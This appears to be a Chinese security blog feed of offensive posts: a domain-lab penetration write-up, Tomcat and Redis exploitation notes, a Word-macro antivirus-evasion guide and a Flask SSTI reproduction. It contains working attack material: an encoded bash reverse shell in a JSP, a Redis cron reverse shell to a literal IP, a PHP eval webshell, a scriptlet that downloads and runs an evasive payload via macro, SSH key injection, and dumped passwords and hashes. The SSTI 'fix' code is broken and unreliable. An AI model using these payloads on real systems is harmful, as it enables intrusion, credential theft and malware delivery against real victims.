svchost.exe                    124 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc                                      
svchost.exe                    264 BFE, DPS, MpsSvc                            
spoolsv.exe                   1180 Spooler                                     
svchost.exe                   1212 AppHostSvc                                  
sqlservr.exe                  1400 MSSQL$SQLEXPRESS                            
SMSvcHost.exe                 1480 NetPipeActivator, NetTcpActivator,          
                                   NetTcpPortSharing                           
sqlwriter.exe                 1900 SQLWriter                                   
VGAuthService.exe             1948 VGAuthService                               
vmtoolsd.exe                  1988 VMTools                                     
svchost.exe                   2028 W3SVC, WAS                                  
fdlauncher.exe                1760 MSSQLFDLauncher$SQLEXPRESS                  
svchost.exe                   1740 TermService                                 
svchost.exe                   1876 PolicyAgent                                 
fdhost.exe                     836 暂缺                                        
conhost.exe                    888 暂缺                                        
dllhost.exe                   2244 COMSysApp                                   
msdtc.exe                     2420 MSDTC                                       
WmiPrvSE.exe                  2620 暂缺                                        
sppsvc.exe                    2124 sppsvc                                      
csrss.exe                      968 暂缺                                        
winlogon.exe                  2472 暂缺                                        
taskhost.exe                  3048 暂缺                                        
dwm.exe                       1608 暂缺                                        
explorer.exe                  1712 暂缺                                        
vmtoolsd.exe                  3008 暂缺                                        
cmd.exe                       3060 暂缺                                        
conhost.exe                   2924 暂缺                                        
mmc.exe                       2580 暂缺                                        
TrustedInstaller.exe          1476 TrustedInstaller                            
cmd.exe                       2428 暂缺                                        
conhost.exe                   2264 暂缺                                        
java.exe                       496 暂缺                                        
cmd.exe                        488 暂缺                                        
conhost.exe                   2692 暂缺                                        
sc.exe                        2104 暂缺                                        
cmd.exe                       1796 暂缺                                        
conhost.exe                   3020 暂缺                                        
sc.exe                        3004 暂缺                                        
cmd.exe                       2600 暂缺                                        
conhost.exe                   2788 暂缺                                        
sc.exe                        2524 暂缺                                        
cmd.exe                        292 暂缺                                        
conhost.exe                    336 暂缺                                        
sc.exe                         356 暂缺                                        
cmd.exe                       1468 暂缺                                        
conhost.exe                   1824 暂缺                                        
tasklist.exe                  2164 暂缺 
</code></pre>
<p>尝试上线cs</p>
<p>存在360，所以需要免杀的马，这里我使用我写的shellcodeloader，完美过360.</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/5.png" alt="1632211789400" loading="lazy"></figure>
<h1 id="0x05-内网信息收集以及横向">0x05 内网信息收集以及横向</h1>
<p>密码抓取，发现域控DC登录过。</p>
<pre><code class="language-shell">Authentication Id : 0 ; 9556781 (00000000:0091d32d)
Session           : CachedInteractive from 2
User Name         : Administrator
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2021/9/21 15:40:41
SID               : S-1-5-21-2756371121-2868759905-3853650604-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : Administrator
	 * Domain   : de1ay.com
	 * Password : 1qaz@WSX
	ssp :	
	credman :
</code></pre>
<p>使用net view以及hash传递上线。</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/6.png" alt="1632216003567" loading="lazy"></figure>
<h1 id="0x06-域权限维持">0x06 域权限维持</h1>
<p>域控密码抓取</p>
<pre><code class="language-shell">Authentication Id : 0 ; 226447 (00000000:0003748f)
Session           : Interactive from 1
User Name         : de1ay
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2021/9/20 17:12:55
SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
	msv :	
	 [00000003] Primary
	 * Username : de1ay
	 * Domain   : DE1AY
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	 [00010000] CredentialKeys
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	wdigest :	
	 * Username : de1ay
	 * Domain   : DE1AY
	 * Password : (null)
	kerberos :	
	 * Username : de1ay
	 * Domain   : DE1AY.COM
	 * Password : (null)
	ssp :	KO
	credman :
	
beacon&gt; hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82501 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:191fbaef80e1b2641b0e79f03c634ce4:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:288707796e6021d379ae70f0acd53e88:::
WEB$:1603:aad3b435b51404eeaad3b435b51404ee:6aeba9f5141c4f8d47a1c26173aecb26:::
</code></pre>
<p>​</p>
<p>伪造黄金票据</p>
<p>条件：</p>
<p>1.域名称</p>
<p>2.域的SID值</p>
<p>3.域的KRBTGT账户NTLM密码哈希</p>
<p>4.伪造用户名</p>
<p>具体操作参考：https://blog.csdn.net/qq_32731075/article/details/118193887</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/7.png" alt="1632220218868" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/8.png" alt="1632220391203" loading="lazy"></figure>
<!-- more -->
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[tomcat漏洞总结]]></title>
        <id>https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/</id>
        <link href="https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/">
        </link>
        <updated>2021-08-30T02:12:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-cve-2017-12615">0x01 CVE-2017-12615</h1>
<p>CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本</p>
<p>流程：</p>
<p>抓包，修改为put请求就行。</p>
<pre><code class="language-sql">PUT /test.txt HTTP/1.1

testpoc
</code></pre>
<p>响应包为201表示成功</p>
<p>同理可以上传冰蝎马这些东西</p>
<p>上传这里可能会404，所以需要绕过</p>
<pre><code class="language-powershell">1.Windows下不允许文件以空格结尾
以PUT /test.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格

2.Windows NTFS流
Put/test.jsp::$DATA HTTP/1.1

3./在文件名中是非法的，也会被去除（Linux/Windows）
Put/test.jsp/ Http:/1.1

</code></pre>
<h1 id="0x02-cve-2020-1938">0x02 CVE-2020-1938</h1>
<p>漏洞复现</p>
<p>我复现了一下，感觉这个洞比较鸡肋</p>
<p>首先寻找poc</p>
<pre><code class="language-shell">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境

查看文件
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml

反弹shell
生成一个test.txt
&lt;%
    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print(&quot;&lt;pre&gt;&quot;);
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print(&quot;&lt;/pre&gt;&quot;);
%&gt;
然后想办法把txt传入服务器。
监听端口
使用poc反弹shell
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.180.139 -p 8009 -f test.txt

也可以使用msf，这里就不细说了，反正感觉有点鸡肋

</code></pre>
<h1 id="0x03-cve-2019-0232">0x03 CVE-2019-0232</h1>
<p>2333</p>
<h1 id="0x04-弱口令war包部署">0x04  弱口令＋war包部署</h1>
<p>这个洞是tomcat最好用的</p>
<h1 id="0x05-暴力破解">0x05 暴力破解</h1>
<p>可以使用msf的模块 ：auxiliary/scanner/http/tomcat_mgr_login</p>
<p>也可以使用burp抓包</p>
<p>参考链接：https://xz.aliyun.com/t/10083#toc-10</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[靶场练习]]></title>
        <id>https://www.yyxyy.xyz/post/ba-chang-lian-xi/</id>
        <link href="https://www.yyxyy.xyz/post/ba-chang-lian-xi/">
        </link>
        <updated>2021-08-30T02:06:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-环境准备">0x01 环境准备</h1>
<p>1.kali 外网服务器（攻击机） win10 外网攻击机</p>
<p>2.win7(双网卡)  外网服务器  仅主机模式和nat模式</p>
<p>3.win2003(内网)  nat模式  拟内网域成员主机</p>
<p>4.win2008(内网)  nat模式 内网域控主机</p>
<p>win7打开phpstudy</p>
<h1 id="0x02-信息收集">0x02 信息收集</h1>
<p>nmap收集：</p>
<pre><code class="language-shell">PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: GOD)
1025/tcp open  msrpc        Microsoft Windows RPC
1026/tcp open  msrpc        Microsoft Windows RPC
1027/tcp open  msrpc        Microsoft Windows RPC
1028/tcp open  msrpc        Microsoft Windows RPC
1029/tcp open  msrpc        Microsoft Windows RPC
3306/tcp open  mysql        MySQL (unauthorized)
MAC Address: 00:0C:29:D6:F7:87 (VMware)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5s, deviation: 0s, median: -5s
|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:d6:f7:87 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-29T03:31:32
|_  start_date: 2021-08-29T02:47:18
</code></pre>
<p>发现80端口是个php探针</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/1.png" alt="1630208790337" loading="lazy"></figure>
<p>对其目录进行扫描，发现phpmyadmin。这里就可以考虑phpmyadmin的弱口令，进后台拿shell。<img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/2.png" alt="1630209693686" loading="lazy"></p>
<h1 id="0x03-漏洞攻击">0x03 漏洞攻击</h1>
<p>第一条线</p>
<p>其实看见445端口开放，以及win7这个信息就想到了ms17010，（中间打蓝屏了几次哈哈哈）</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/3.png" alt="1630209528653" loading="lazy"></figure>
<p>设置payload</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/4.png" alt="1630209775879" loading="lazy"></figure>
<p>成了。</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/5.png" alt="1630209795143" loading="lazy"></figure>
<p>第二条线</p>
<p>使用root/root弱口令进入后台。</p>
<p>找到执行sql语句的点</p>
<pre><code class="language-sql">set global general_log='on'   //开启日志
set global general_log_file =&quot;C:/phpStudy/WWW/conf.php&quot;   //写马，php探针时已经获取绝对路径
select &quot;&lt;?php eval($_POST['x'])?&gt;&quot;  //插入一句话

</code></pre>
<p>蚁剑连接</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/6.png" alt="1630210442285" loading="lazy"></figure>
<p>第三条线</p>
<p>yxcms后台使用admin/123456登录，在前台模板哪里可以直接修改php</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/7.png" alt="1630210795514" loading="lazy"></figure>
<p>http://192.168.227.129/yxcms/protected/apps/default/view/default/目录下有修改的php</p>
<p>使用哥斯拉连接</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/8.png" alt="1630211663773" loading="lazy"></figure>
<h1 id="0x04-内网信息收集">0x04 内网信息收集</h1>
<p>首先用已经拿到的webshell上线cs</p>
<p>使用ipconfig /all判断当前服务器所处的位置。这里看见这台服务器是双网卡，且存在域。</p>
<p>也可以使用systeminfo 命令收集主机信息。查看安装的补丁，根据补丁可以判断使用哪些漏洞进行提权</p>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/9.png" alt="1630245480556" loading="lazy"></figure>
<p>可以使用tasklist，来查看是否安装的有杀软。</p>
<p>这里使用CS提权</p>
<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/10.png" alt="1630244253114" loading="lazy"></figure>
<p>一些信息收集的命令</p>
<pre><code class="language-shell">ipconfig /all 查询一下本机的一些情况,IP段 网关 属于不属于域
net view 查询一些存在联系的机器,一般以机器名显示,我们需要对其PING出IP,一是方便查询哪些重要机器的IP,二是方便查询存在几个段
net view /domain 查询有几个域 因为大型网络里面一般不止一个域的
net group /domain 查询域里面的组
net user /domain 查询域用户
net group “domain admins” /domain 查询域管理用户组
</code></pre>
<p>使用猕猴桃抓取密码，这里抓到了明文。</p>
<p>在命令行开启3389端口（真实环境不建议开3389，除非本身开着的，高危行为）</p>
<pre><code class="language-powershell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
</code></pre>
<p>使用获取的账号密码进行远程连接</p>
<figure data-type="image" tabindex="10"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/11.png" alt="1630246747875" loading="lazy"></figure>
<p>探测内网存活主机。</p>
<pre><code class="language-powershell">for /l %i in (1,1,255) do @ping 192.168.64.%i -w 1 -n 1|find /i &quot;ttl=&quot;
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/12.png" alt="1630247142123" loading="lazy"></figure>
<h1 id="0x05-横向渗透">0x05 横向渗透</h1>
<p>这里利用psexec，因为192.168.52.0/24段不能直接连接。</p>
<p>首先新建一个smb监听，然后利用cs的spwn派生会话，选择smb监听。</p>
<p>然后进行hash传递攻击</p>
<p>在视图--&gt;目标--&gt;选中前面扫描的所有目标--&gt;右键jump--&gt;psexec--&gt;选取凭证和监听器以及会话--&gt;运行</p>
<figure data-type="image" tabindex="12"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/13.png" alt="1630249581022" loading="lazy"></figure>
<p>token窃取</p>
<p>除了前面使用获取的hash，也可以直接窃取token来登录其它服务器</p>
<p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p>
<p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p>
<figure data-type="image" tabindex="13"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/14.png" alt="1630250074750" loading="lazy"></figure>
<p>然后勾选使用当前会话令牌</p>
<figure data-type="image" tabindex="14"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/15.png" alt="1630250193248" loading="lazy"></figure>
<p>效果差不多。</p>
<p>也可以联动msf使用一些常见的漏洞进行扫描，批量打。比如ms_17010</p>
<p>暂时先这样。</p>
<p>参考连接：</p>
<p>https://soapffz.com/sec/558.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[word宏免杀]]></title>
        <id>https://www.yyxyy.xyz/post/word-hong-mian-sha/</id>
        <link href="https://www.yyxyy.xyz/post/word-hong-mian-sha/">
        </link>
        <updated>2021-08-25T07:02:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1>
<p>仅仅是为了娱乐。</p>
<h1 id="知识点">知识点</h1>
<ol>
<li>宏代码,不执行regsvr32命令 远程调用sct文件,实现免杀</li>
<li>csharp 可执行js ,反序列化加载</li>
</ol>
<p>具体的原理：</p>
<p>利用宏调用Dlllnstall api</p>
<pre><code class="language-vbscript">Private Declare PtrSafe Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long

Sub AutoOpen()
        DllInstall False, ByVal StrPtr(&quot;ip/y.sct&quot;) ' False = &quot;Don't install&quot;
End Sub
</code></pre>
<h1 id="后续操作">后续操作</h1>
<h2 id="0x01-远程部署一个sct">0x01 远程部署一个sct</h2>
<p>例如：弹个计算器</p>
<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
  progid=&quot;TESTING&quot;
  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;
  &lt;script language=&quot;JScript&quot;&gt;
    &lt;![CDATA[
var foo = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
    ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre>
<p>后续只需要使用word宏远程加载这个sct文件就成。</p>
<h2 id="0x02-免杀">0x02 免杀</h2>
<p>操作和前面一样。</p>
<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
    progid=&quot;ShortJSRAT&quot;
    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
    &lt;!-- Learn from Casey Smith @subTee --&gt;
    &lt;script language=&quot;JScript&quot;&gt;
        &lt;![CDATA[
            var WSHShell = new ActiveXObject(&quot;WScript.Shell&quot;);
            path = WSHShell.ExpandEnvironmentStrings(&quot;%temp%&quot;);
            var filepath = path+&quot;/explorer.exe&quot;;
            var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
            xhr.open(&quot;GET&quot;,&quot;免杀马&quot;, false);
            xhr.send();
            if (xhr.Status == 200) {
                var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
                var stream = new ActiveXObject(&quot;ADODB.Stream&quot;);
                stream.Open();
                stream.Type = 1;
                stream.Write(xhr.ResponseBody);
                stream.Position = 0;
                if (fso.FileExists(filepath)){
                   fso.DeleteFile(filepath);
                }
                stream.SaveToFile(filepath);
                stream.Close();
                new ActiveXObject(&quot;WScript.Shell&quot;).Exec(filepath);
            }
 
 
        ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre>
<h2 id="0x03-对word的一些处理">0x03 对word的一些处理</h2>
<p>后续会思考如何才能让目标打开宏，怎么样才能更加逼真</p>
<h1 id="0x04-总结">0x04 总结</h1>
<p>感谢愿意陪我玩的朋友。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bapass/1.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Redis未授权利用及思考]]></title>
        <id>https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/</id>
        <link href="https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/">
        </link>
        <updated>2021-08-23T14:02:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="redis几种基本拿shell的方法">redis几种基本拿shell的方法</h1>
<h2 id="0x01-计划任务执行命令反弹shell">0x01 计划任务执行命令反弹shell</h2>
<pre><code class="language-shell">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/104.168.147.13/8888 0&gt;&amp;1\n\n&quot;
config set dir /var/spool/cron
config set dbfilename root
save
</code></pre>
<h2 id="0x02-写web目录">0x02 写web目录</h2>
<pre><code class="language-shell">config set dir /tmp/   这里应该是web目录
config set dbfilename test.php
set 1 &quot;&lt;?= phpinfo(); ?&gt;&quot;
save
</code></pre>
<h2 id="0x03-写ssh-key">0x03 写SSH key</h2>
<pre><code class="language-shell">ssh-key -t rsa#然后按照next执行就行了
(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt
cat test.txt |redis-cli -h 192.168.0.109 -a 123456 -x set crackit
redis执行
config set dir /root/.ssh
config set dbfilename authorized_keys
save
</code></pre>
<h2 id="0x04-主从复制">0x04 主从复制</h2>
<p>https://github.com/vulhub/redis-rogue-getshell</p>
<p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
<h1 id="redis-在win下面的利用及思考">redis 在win下面的利用及思考</h1>
<h2 id="网上常见的方法">网上常见的方法</h2>
<p>1.web目录写马</p>
<p>2.写启动项</p>
<p>https://www.bilibili.com/read/cv7358287/</p>
<p>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</p>
<h2 id="一些其它的方法">一些其它的方法</h2>
<p>1.dll劫持</p>
<p>2.覆写一些文件，让用户点击。</p>
<p>3.覆写sethc.exe。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Flask ssti 漏洞复现]]></title>
        <id>https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/">
        </link>
        <updated>2021-06-09T08:01:44.000Z</updated>
        <content type="html"><![CDATA[<h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
<h6 id="环境">环境</h6>
<p>使用vulhub里面的flask/ssti环境</p>
<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + name)
    return t.render()

if __name__ == &quot;__main__&quot;:
    app.run()
    
    
// 很简单发现了name变量是我们能够控制的。
</code></pre>
<h6 id="漏洞成因分析">漏洞成因分析</h6>
<p>首先输入正常值</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
<p>然后输入嵌套jinja2语法的语句</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
<p>很容易就发现了这一处漏洞</p>
<h6 id="代码修复">代码修复</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + {{temp}})
    return t.render(temp=&quot;name&quot;)

if __name__ == &quot;__main__&quot;:
    app.run()
    
//这样就能避免这个漏洞
</code></pre>
<h6 id="漏洞利用">漏洞利用</h6>
<p>vulhub的POC</p>
<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
</code></pre>
<p>得到一下结果</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
<p>Python的一些魔术方法</p>
<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;

#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
&gt;&gt;&gt; class A():
...     pass
&gt;&gt;&gt; class B():
...     pass
&gt;&gt;&gt; class C(A,B):
...     pass
&gt;&gt;&gt; C.__base__
&lt;class '__main__.A'&gt;
&gt;&gt;&gt; C.__bases__
(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)

#3 __mro__ :以元组的方式返回继承关系
&gt;&gt;&gt; C.__mro__
(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)


#4 __subclasses__():以列表的形式返回类的子类
&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class 